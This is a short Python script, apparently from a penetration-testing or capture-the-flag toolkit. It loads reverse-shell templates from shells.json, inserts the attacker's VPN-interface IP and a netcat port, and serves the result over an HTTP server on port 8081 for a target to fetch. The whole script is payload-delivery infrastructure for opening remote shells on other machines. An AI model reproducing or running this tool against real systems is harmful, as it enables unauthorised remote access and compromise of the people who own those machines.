import argparse
import threading
import textwrap
import http.server
import json
from server.server import Server
from utils.utils import get_ip_address, print_shells

with open('shells.json', 'r') as f:
    shells = json.load(f)

parser = argparse.ArgumentParser(
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=textwrap.dedent('''\
Shells available in shells.json:
{shells}

You can add new shells in the shells.json file using $ip and $port placeholder
'''.format(shells=print_shells(shells))))

parser.add_argument('-t', '--type',
                    help='Set up type shell',
                    default='std')
parser.add_argument('-i', '--inet',
                    help='Set up the listening interface: tun0 | enp4s0',
                    default='tun0')
parser.add_argument('-p', '--port',
                    help='Set netcat port listening',
                    default='9001')
parser.add_argument('-l', '--listener',
                    help='Deploy a quick listener',
                    action=argparse.BooleanOptionalAction)

args = parser.parse_args()
server_address = ('0.0.0.0', 8081)
address = get_ip_address(args.inet)
listener = args.listener

server = Server(server_address, shells.get(args.type), address, args.port)
httpd = http.server.HTTPServer(server_address, server)
thread = threading.Thread(target=httpd.serve_forever)
thread.start()
